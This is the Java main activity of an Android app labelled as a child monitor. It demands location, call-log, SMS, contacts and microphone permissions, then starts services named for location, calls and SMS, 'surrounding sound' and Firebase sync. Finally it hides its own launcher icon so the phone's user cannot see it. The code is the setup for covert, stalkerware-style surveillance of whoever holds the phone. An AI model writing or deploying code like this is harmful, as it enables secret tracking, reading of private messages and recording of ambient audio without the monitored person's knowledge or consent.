package com.childmonitor;

import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.childmonitor.services.AppUsageService;
import com.childmonitor.services.CallSmsService;
import com.childmonitor.services.DailyReportService;
import com.childmonitor.services.FirebaseSyncService;
import com.childmonitor.services.LocationService;
import com.childmonitor.services.SurroundingSoundService;
import com.childmonitor.utils.FirebaseHelper;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private static final int USAGE_STATS_REQUEST = 103;

    private static final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.RECEIVE_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences prefs = getSharedPreferences("cm_prefs", Context.MODE_PRIVATE);
        boolean isSetupDone = prefs.getBoolean("setup_done", false);
        if (!isSetupDone) {
            requestAllPermissions();
        } else {
            startAllServicesAndHide();
        }
    }

    private void requestAllPermissions() {
        if (!hasAllRuntimePermissions()) {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
                return;
            }
        }
        requestBatteryOptimizationExemption();
        if (!hasUsageStatsPermission()) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivityForResult(intent, USAGE_STATS_REQUEST);
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this,
                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        PERMISSION_REQUEST_CODE + 1);
            }
        }
        startAllServicesAndHide();
    }

    private boolean hasAllRuntimePermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    private void startAllServicesAndHide() {
        FirebaseHelper.initialize(this);
        startServiceSafely(new Intent(this, LocationService.class));
        startServiceSafely(new Intent(this, AppUsageService.class));
        startServiceSafely(new Intent(this, CallSmsService.class));
        startServiceSafely(new Intent(this, SurroundingSoundService.class));
        startServiceSafely(new Intent(this, FirebaseSyncService.class));
        startServiceSafely(new Intent(this, DailyReportService.class));
        getSharedPreferences("cm_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("setup_done", true).apply();
        hideAppIcon();
        finish();
    }

    private void startServiceSafely(Intent intent) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            // ignore
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            new android.content.ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        requestAllPermissions();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        requestAllPermissions();
    }
}
